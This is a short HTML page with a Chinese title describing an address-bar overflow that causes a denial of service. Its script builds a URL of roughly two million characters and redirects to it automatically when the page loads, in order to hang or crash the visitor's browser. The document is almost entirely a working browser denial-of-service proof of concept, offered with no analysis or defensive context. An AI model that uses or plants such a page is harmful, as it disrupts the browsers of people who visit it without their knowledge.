<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>浏览器地址栏溢出，通过js脚本拼接异常URL地址，用户触发可导致DOS攻击</title>
	
<script type="text/javascript">
 function mul3 (str, num) {
  if (!num) return "";
  var orig = str,
    soFar = [str],
    added = 1,
    left, i;
  while (added < num) {
    left = num - added;
    str = orig;
    for (i = 2; i < left; i *= 2) {
      str += str;
    }
    soFar.push(str);
    added += (i / 2);
  }
  return soFar.join("");
 }
 var junka = "a";
 var junk = mul3(junka,2097033);
 window.location.href = "http://" + junk;
 </script>


 </head>
